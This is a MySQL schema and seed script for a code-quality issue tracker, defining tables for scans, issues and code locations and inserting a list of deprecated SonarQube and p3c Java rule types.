-- auto-generated definition
create table file_exclude
(
    id           int auto_increment
        primary key,
    file_path    varchar(512) not null comment '忽略的文件路径',
    repo_uuid    char(36)     not null comment '仓库id',
    create_time  datetime     not null comment '创建时间',
    account_uuid char(36)     not null comment '设置这一忽略文件路径的账户id'
)
    comment '对用户指定路径文件的忽略' engine = MyISAM,
    charset utf8mb4;

-- auto-generated definition
create table issue
(
    id                int auto_increment
        primary key,
    type              varchar(256)                  null,
    tool              varchar(45)                   null,
    start_commit      varchar(64)                   null,
    start_commit_date datetime                      null,
    end_commit        varchar(64)                   null,
    end_commit_date   datetime                      null,
    repo_uuid         varchar(36)                   null,
    file_name         varchar(512)                  null,
    create_time       datetime                      null,
    update_time       datetime                      null,
    priority          tinyint                       null,
    status            varchar(20)                   null,
    manual_status     varchar(45) default 'Default' null,
    resolution        varchar(20)                   null,
    issue_category    varchar(50)                   null,
    producer          varchar(64)                   null,
    solver            varchar(64)                   null,
    solve_commit      varchar(64)                   null,
    solve_commit_date datetime                      null,
    uuid              varchar(36)                   null
)
    charset = utf8mb4;

create index issue__uuid
    on issue (uuid);
create index issue_repo_uuid_index
    on issue (repo_uuid);


-- auto-generated definition
create table issue_repo
(
    id                   int auto_increment
        primary key,
    repo_uuid            varchar(36) not null,
    branch               varchar(64) not null,
    tool                 varchar(16) not null,
    status               varchar(16) not null,
    scanned_commit_count int         not null,
    scan_time            mediumtext  null,
    total_commit_count   int         not null,
    start_commit         varchar(64) not null,
    start_scan_time      datetime    not null,
    end_scan_time        datetime    null
)
    charset = utf8mb4;

create index issue_repo_repo_uuid_index
    on issue_repo (repo_uuid);

-- auto-generated definition
create table issue_scan
(
    uuid           varchar(36)  not null comment '主键'
        primary key,
    tool           varchar(45)  null comment '扫描工具类型',
    start_time     datetime     null comment '扫描开始时间',
    end_time       datetime     null comment '扫描结束时间',
    status         varchar(32)  not null comment '扫描完成状态',
    result_summary mediumtext   null comment '扫描结果内容总结',
    repo_uuid      varchar(36)  null comment '项目仓库id',
    commit_id      varchar(64)  null comment '本次commit id',
    commit_time    datetime     null comment '本次commit时间',
    author_time    datetime     null comment '本次 commit 的 author time',
    developer      varchar(64)  null comment '本次 commit 的开发者',
    parent_commit  varchar(255) null comment '本次 commit 的直接父节点',
    constraint uuid
        unique (uuid)
)
    charset = utf8mb4;

create index idx_scan_repo_id
    on issue_scan (repo_uuid);

create index idx_scan_tool
    on issue_scan (tool);

-- auto-generated definition
create table issue_type
(
    uuid                 varchar(36)                 not null comment '主键'
        primary key,
    type                 varchar(255)                null comment 'issue的具体类型',
    specification_source varchar(36)                 null comment '规则来源',
    category             varchar(128)                null comment 'issue所属的类别',
    description          mediumtext                  null comment 'issue的描述',
    language             varchar(45)                 null,
    status               varchar(32) default 'READY' null comment 'issue 状态，启用/弃用/测试等',
    severity             varchar(45)                 null,
    scope                varchar(32) default 'LINE'  not null comment '类级别、方法基本、代码块/行级别',
    constraint uuid
        unique (uuid)
)
    charset = utf8mb4;

-- auto-generated definition
create table location
(
    id            int auto_increment
        primary key,
    uuid          varchar(36)   not null comment '主键',
    start_line    mediumint     null comment 'bug所在上下文的开始行',
    end_line      mediumint     null comment 'bug所在上下文的结尾行',
    bug_lines     varchar(4096) null comment '表示这个bug在文件中具体体现在哪些行',
    start_token   mediumint     null,
    end_token     mediumint     null,
    file_name     varchar(512)  not null comment 'bug所在文件路径',
    class_name    varchar(256)  null comment 'bug所在类名',
    method_name   text          null comment 'bug所在方法名',
    rawIssue_uuid varchar(36)   not null comment 'bug所属rawissueID',
    code          text          null comment 'bug源代码',
    offset        int default 0 not null,
    repo_uuid     varchar(36)   null
)
    charset = utf8mb4;

create index raw_issue_id_index
    on location (rawIssue_uuid);
create index location_repo_uuid_index
    on location (repo_uuid);

-- auto-generated definition
create table raw_issue
(
    id             int auto_increment
        primary key,
    uuid           varchar(36)  not null comment '主键',
    type           varchar(200) not null comment '缺陷类型',
    tool           varchar(45)  null comment 'rawissue类别',
    detail         mediumtext   null,
    file_name      varchar(512) null comment 'rawissue文件名',
    scan_uuid      varchar(36)  not null comment 'rawissue扫描id',
    issue_uuid     varchar(36)  null,
    commit_id      varchar(64)  not null comment '本次commit id',
    repo_uuid      varchar(36)  not null comment 'rawissue所属仓库id',
    code_lines     int          null,
    developer      varchar(64)  null,
    version        int          not null,
    raw_issue_hash varchar(36)  null
)
    charset = utf8mb4;

create index idx_category_repoId
    on raw_issue (tool, repo_uuid);

create index idx_rawIssue_category
    on raw_issue (tool);

create index idx_rawIssue_issue_id
    on raw_issue (issue_uuid);

create index idx_rawIssue_repo_id
    on raw_issue (repo_uuid);

create index idx_rawIssue_repo_id_category
    on raw_issue (repo_uuid, tool);

create index idx_uuid_commit_status
    on raw_issue (uuid, tool, repo_uuid);

create index idx_repo_id_hash
    on raw_issue (repo_uuid, raw_issue_hash);

-- auto-generated definition
create table raw_issue_match_info
(
    id                int auto_increment
        primary key,
    cur_rawIssue_uuid varchar(36)  null,
    cur_commit_id     varchar(64)  null,
    pre_rawIssue_uuid varchar(36)  null,
    pre_commit_id     varchar(64)  null,
    issue_uuid        varchar(36)  null,
    status            varchar(64)  null,
    repo_uuid         varchar(36)  null,
    solve_way         varchar(512) null
)
    charset = utf8mb4;
create index raw_issue_match_info_repo_uuid_index
    on raw_issue_match_info (repo_uuid);

-- auto-generated definition
create table scan_result
(
    id               int auto_increment comment '主键
'
        primary key,
    category         varchar(45)                            not null comment '扫描结果类型',
    repo_uuid        varchar(36)                            not null comment '扫描的repo文件id',
    scan_date        date                                   not null comment '扫描日期',
    commit_id        varchar(64)                            not null comment '本次commit id',
    commit_date      datetime                               not null comment '本次commit时间',
    developer        varchar(64) collate utf8mb4_unicode_ci null comment '本次commit的提交者',
    new_count        int(10)     default 0                  null comment '新增缺陷总数',
    eliminated_count int(10)     default 0                  null comment '消除缺陷总数',
    remaining_count  int         default 0                  null comment '剩余缺陷总数 ',
    parent_commit_id varchar(64) default 'empty'            null,
    reopen_count     int         default 0                  null
)
    charset = utf8mb4;
create index scan_result_repo_uuid_index
    on scan_result (repo_uuid);


-- auto-generated definition
create table raw_issue_cache
(
    id             int auto_increment
        primary key,
    repo_uuid      char(36)                        not null,
    commit_id      varchar(64)                     not null,
    analyze_result longtext                        null,
    invoke_result  tinyint     default 1           null,
    tool           varchar(32) default 'sonarqube' not null,
    raw_issue_num  int                             null
)
    engine = MyISAM
    charset = utf8mb4;

create index idx_repo_uuid_commit_id
    on raw_issue_cache (repo_uuid, commit_id);

create table issue_repo_scan_list
(
    repo_uuid            varchar(36) primary key,
    branch               varchar(64) not null,
    status               varchar(16) not null,
    start_commit         varchar(64) not null
);


INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('007ffda0-f852-4be9-8fbd-8afa5a4b80e6', 'Broken Null Check', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('008576fb-0f5e-4188-96d9-42197265e4b6', 'Security - Array is stored directly', 'sonarqube', 'VULNERABILITY', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('00b6ebc9-2a62-4376-a4f6-9aeba0ee3aed', 'Avoid Decimal Literals In Big Decimal Constructor', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('00c51c76-679e-44b5-a325-24055793763c', 'Finalize Only Calls Super Finalize', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('01b8b479-ba0b-42d2-b34d-6a57b0549f09', 'Track comments matching a regular expression', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('025837e0-18af-42f3-ae74-d8be096ff740', '[p3c]Class names should be nouns in UpperCamelCase except domain models: DO, BO, DTO, VO, etc.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('02a7da1e-5bfb-4ab5-9404-6d6bbcabae25', 'Databases should be password-protected', 'sonarqube', 'VULNERABILITY', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('02c7c1b7-9107-43db-9df3-3f606d4e119d', '[p3c]Avoid using [Math.random()] by multiple threads.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('03b807dd-1db9-4b33-8563-151d8caa8e66', 'Exception As Flow Control', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('0400922e-4aa7-48c2-91fa-10aa8bf54ec6', 'Avoid Rethrowing Exception', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('04d842c0-19a1-4fde-a506-5f91c148c462', 'Test class without test cases (JUnit 3.x only)', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('0511f50c-0b36-4682-8baa-d17222cdcb17', 'Call Super In Constructor', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('051e1e56-34d0-42fa-88a4-961ca6c7aa30', '[p3c]Constant variable names should be written in upper characters separated by underscores.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('0528b5c7-6973-4a3a-90b2-df276e8b09a9', 'Use Varargs', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('062a60af-f998-48e6-b531-32192660f2ec', 'Default Package', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('075886c0-ea4f-43c3-9e4d-4c8e4be9613a', 'Suspicious Octal Escape', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('087912a2-8fb6-461b-921e-771c99f5bf1a', 'Comment Size', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('09491e76-8468-463a-9864-797bc3fa9515', 'Use ConcurrentHashMap', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('09c19c7a-759f-4b17-9fe1-da679fe523a9', 'Insufficient String Buffer Declaration', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('09cb37e8-1f02-4d06-9931-f868644aeec0', 'Simplify Starts With', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('0a44393d-65ab-4d2a-a3e6-ab3b8e9b5689', 'Strict Exception - Do not throw exception in finally', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('0b2531db-3658-4992-9f63-b822dc6a3fe3', '[p3c]Equals should be invoked by a constant or an object that is definitely not null.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('0b375cf7-b996-43a9-a72a-72d7e56781d8', 'Avoid Final Local Variable', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('0b51985a-2e58-4567-a346-e189d3e01342', '[p3c]Constant variable names should be written in upper characters separated by underscores.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('0ba486bf-dab9-4ab8-935e-9b26c1a69296', 'Local Interface Session Naming Convention', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('0c94e932-6889-49e4-a1d3-5596a43a1ac0', 'Avoid Reassigning Parameters', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('0e192bba-7b49-4250-803f-25d7802f2f25', '[p3c]Attribute rollbackFor of annotation Transactional must be set.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('0e230bec-bb62-4e83-9f4f-08307d4624bd', 'Non Static Initializer', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('0eebd2ba-9b77-4dac-b241-d698a37e44fc', 'Synchronization should not be based on Strings or boxed primitives', 'sonarqube', 'BUG', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('0f4643e5-7409-49fa-bb2a-a1a03ee58b5c', 'Bad Comparison', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('1186af5d-99f0-4614-91a0-4253a323816b', '[p3c]Use System.currentTimeMillis() to get the current millisecond. Do not use new Date().getTime().', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('1215dfc6-8d5a-43a7-b4f4-f2c9f3390e25', 'Unnecessary parentheses', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('12b22aa5-fb25-485a-94c2-912b85f79f05', 'Immutable Field', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('1390d834-89c7-4895-a86f-576276807ef0', 'Avoid Calling Finalize', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('13cc37c2-ecc3-40bb-9846-8346f31e20a7', 'Empty If Stmt', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('1467a123-293c-4419-abef-06108042e1bc', 'JUnit spelling', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('1536da26-baa4-403d-8a10-1261dd22d92b', 'Do Not Call System Exit', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('16ee33e1-583b-4fc5-ad27-2495663aa6f3', 'Finalize Overloaded', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('19a403e2-2cd5-4ee2-81fe-155903451eb1', '"@Import"s should be preferred to "@ComponentScan"s', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('19b983a7-bbb2-4a1a-a9a4-f4cf899060e0', 'Unused imports', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('19bf4845-471e-4cd6-adc6-cb2057dda053', 'Unnecessary Case Change', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('19ca8988-cee9-4ff3-bb56-9938df6bcd65', 'Ncss Constructor Count', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('1bb0faa9-7457-4e93-adf8-8c9303d71308', 'Unnecessary Local Before Return', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('1c9cda4f-0db3-40eb-a9ce-0ba49b540e3f', 'Empty Method In Abstract Class Should Be Abstract', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('1d8e2529-e513-4f54-b805-b3ede71c0519', 'Modified Cyclomatic Complexity', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('1dd29f43-d08d-4aa8-96c8-f9aa6cda9a68', 'Track uses of disallowed constructors', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('1f4dc845-6f70-42fe-a0ac-a7ca70f61a36', '[p3c]Brackets are a part of an Array type. The definition could be: String[] args', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('200a6408-b9d4-4645-b09e-80f1f3822fa1', 'Avoid Using Volatile', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('201eb761-430c-47de-a699-f6537b32db3b', 'Simplify boolean returns', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('2028dd4e-60fd-45a8-beb1-8425a7970067', 'Unused Private Field', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('214ac660-b2dc-439a-ae48-9207dbc8321d', 'Use Collection Is Empty', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('21979929-7abd-459c-aee3-cd024accaa8c', 'JUnit assertions should include a message', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('219901f0-da3b-40de-8824-946d1a422f36', 'Changing or bypassing accessibility is security-sensitive', 'sonarqube', 'SECURITY_HOTSPOT', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('2211bc1f-48ec-45b7-b687-2d1c0cb5191d', '[p3c]Magic values, except for predefined, are forbidden in coding.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('22d0536e-991b-4fac-a94e-5fac2e250979', 'Abstract naming', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('236b5eb4-1d17-495b-8733-38dae31e60bf', 'Generic wildcard types should not be used in return parameters', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('244d6edb-5806-4dd6-8854-89b9d5bc9222', 'JUnit Test Contains Too Many Asserts', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('24617fe3-953f-4cae-9bea-231f2e7e86cf', 'Dont Use Float Type For Loop Indices', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('24da516c-b317-4349-8a01-482cecaecbbc', 'Unused Imports (With Type Resolution)', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('257388e8-431d-4800-a6e4-87cf483a2ae1', 'Abstract class without any methods', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('26514e6e-e142-409f-be04-e83daa2bbf55', '[p3c]Use ScheduledExecutorService instead.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('26ec5b95-837f-4b27-8eb3-ac148979674b', 'Cypher Block Chaining IV''s should be random and unique', 'sonarqube', 'VULNERABILITY', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('27b4a380-2a97-4d9a-937e-d7ed7863b08a', 'Unnecessary constructor', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('27cd0d31-d33c-458a-ba6c-fe7a3f09e13e', 'Big Integer Instantiation', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('285be0df-66be-47c4-9288-818408554063', 'Use String Buffer Length', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('29ff2749-33f8-4ab8-babe-1db71ecd2250', 'Switch statements should have default', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('2b5c3609-3d18-4fc4-bbfb-2733c70fd6a2', '[p3c]All names should not start or end with an underline or a dollar sign.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('2c2ba90b-2bae-4ee7-a1ed-8fdcdf05826b', 'Comment Content', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('2c79d9f0-33d2-468f-ae49-e775d2156313', 'Android - Do Not Hard Code SD Card', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('2db6ea5b-4859-486b-9df8-6f58c2f2b34f', '[p3c]While defining POJO classes like DO, DTO, VO, etc., do not assign any default values to the members.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('2e9d6381-965e-4b7f-b535-91c011c0727a', 'Avoid Synchronized At Method Level', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('2ff729d9-ea6b-49d4-b540-027236d7f6ed', 'Short Class Name', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('314ce312-03e2-4507-80b3-15ed4796b6b3', 'Guard Log Statement Java Util', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('34f6caa9-a6ed-4ad6-b3fe-a143bfdb8ebb', '[p3c]Explicitly creating threads is not allowed, use thread pool instead.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('3567492f-8d88-40b1-b31f-eca5a8f1a24e', 'Duplicate Imports', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('359e52d9-2fba-4237-be4a-6c2d0fb7bd6f', 'Assignment In Operand', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('369835c2-98fd-499d-8572-fb9a66596204', 'Unused local variable', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('36a36996-f470-4e11-87f6-10b8e1f81684', 'Remote Session Interface Naming Convention', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('36eaaf08-9dcf-4034-8422-a43ca413ad8e', 'Compare Objects With Equals', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('37af7bcb-6d37-41b4-9ffe-17611b94eee2', '[p3c]''L'' instead of ''l'' should be used for long or Long variable.', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('385e9df6-6bc2-4988-9121-366005050550', 'Too many methods', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('394fdd3c-ecd4-4105-934a-db92f3dcb60b', 'Ncss Method Count', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('39505ca5-29f7-46f1-93fd-8f17e52cd506', 'JUnit Use Expected', 'sonarqube', 'CODE_SMELL', null, 'java', 'DEPRECATED', null, 'BLOCK');
